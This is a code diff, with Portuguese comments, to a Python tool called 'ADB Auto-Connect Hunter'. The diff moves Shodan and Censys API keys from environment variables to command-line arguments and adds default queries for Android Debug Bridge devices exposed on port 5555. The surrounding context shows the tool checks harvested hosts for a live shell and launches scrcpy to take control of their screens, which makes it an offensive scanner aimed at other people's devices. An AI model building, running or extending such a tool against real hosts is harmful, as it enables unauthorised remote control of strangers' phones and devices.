@@ -2,13 +2,16 @@
 import argparse
 import base64
 import json
-import os
 import shutil
 import subprocess
 import sys
 import urllib.parse
 import urllib.request
 from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# Queries padrão para encontrar dispositivos ADB expostos
+DEFAULT_SHODAN_QUERY = "Android Debug Bridge port:5555"
+DEFAULT_CENSYS_QUERY = "services.port=5555 and services.service_name=ADB"
 
 def check_adb_connection(ip, port):
     """
@@ -54,17 +57,13 @@ def check_live_shell(ip, port):
         pass
     return ip, False
 
-def fetch_shodan(query, limit):
+def fetch_shodan(api_key, query, limit):
     """
-    Busca hosts no Shodan. Requer a variável de ambiente SHODAN_API_KEY.
+    Busca hosts no Shodan usando a API key informada.
     Retorna uma lista de IPs (string).
     """
-    key = os.environ.get("SHODAN_API_KEY")
-    if not key:
-        print("[!] SHODAN_API_KEY nao definido; pulando Shodan.")
-        return []
     url = "https://api.shodan.io/shodan/host/search?" + urllib.parse.urlencode(
-        {"key": key, "query": query})
+        {"key": api_key, "query": query})
     try:
         with urllib.request.urlopen(url, timeout=30) as r:
             data = json.load(r)
@@ -76,16 +75,11 @@ def fetch_shodan(query, limit):
         print(f"[!] Erro na consulta Shodan: {e}")
         return []
 
-def fetch_censys(query, limit):
+def fetch_censys(api_id, secret, query, limit):
     """
-    Busca hosts no Censys (API v2 Hosts). Requer CENSYS_API_ID e
-    CENSYS_API_SECRET. Retorna uma lista de IPs (string).
+    Busca hosts no Censys (API v2 Hosts) com as credenciais informadas.
+    Retorna uma lista de IPs (string).
     """
-    api_id = os.environ.get("CENSYS_API_ID")
-    secret = os.environ.get("CENSYS_API_SECRET")
-    if not (api_id and secret):
-        print("[!] CENSYS_API_ID/CENSYS_API_SECRET nao definidos; pulando Censys.")
-        return []
     url = "https://search.censys.io/api/v2/hosts/search?" + urllib.parse.urlencode(
         {"q": query, "per_page": min(limit, 100)})
     auth = base64.b64encode(f"{api_id}:{secret}".encode()).decode()
@@ -131,12 +125,13 @@ def launch_scrcpy(targets):
 def main():
     ap = argparse.ArgumentParser(description="ADB Auto-Connect Hunter")
     ap.add_argument("-f", "--file", help="Arquivo com IPs (um por linha)")
-    ap.add_argument("--shodan", metavar="QUERY",
-                    help="Buscar alvos no Shodan (ex: 'Android Debug Bridge port:5555'). "
-                         "Requer SHODAN_API_KEY no ambiente.")
-    ap.add_argument("--censys", metavar="QUERY",
-                    help="Buscar alvos no Censys (ex: 'services.port=5555 and "
-                         "services.service_name=ADB'). Requer CENSYS_API_ID e CENSYS_API_SECRET.")
+    ap.add_argument("--shodan", metavar="API_KEY",
+                    help="Buscar alvos no Shodan usando esta API key "
+                         f"(query padrão: '{DEFAULT_SHODAN_QUERY}')")
+    ap.add_argument("--censys", metavar="ID:SECRET",
+                    help="Buscar alvos no Censys usando 'api_id:secret' "
+                         f"(query padrão: '{DEFAULT_CENSYS_QUERY}')")
+    ap.add_argument("--query", help="Sobrescreve a query padrão usada nas APIs")
     ap.add_argument("--limit", type=int, default=100,
                     help="Máximo de hosts por fonte de API (padrão 100)")
     ap.add_argument("-p", "--port", type=int, default=5555, help="Porta ADB (padrão 5555)")
@@ -152,9 +147,12 @@ def main():
     if args.file:
         ips += load_from_file(args.file)
     if args.shodan:
-        ips += fetch_shodan(args.shodan, args.limit)
+        ips += fetch_shodan(args.shodan, args.query or DEFAULT_SHODAN_QUERY, args.limit)
     if args.censys:
-        ips += fetch_censys(args.censys, args.limit)
+        api_id, sep, secret = args.censys.partition(":")
+        if not (api_id and sep and secret):
+            sys.exit("[!] Formato invalido para --censys. Use 'api_id:secret'.")
+        ips += fetch_censys(api_id, secret, args.query or DEFAULT_CENSYS_QUERY, args.limit)
 
     if not ips:
         sys.exit("[!] Nenhuma fonte de IPs. Use -f, --shodan ou --censys.")
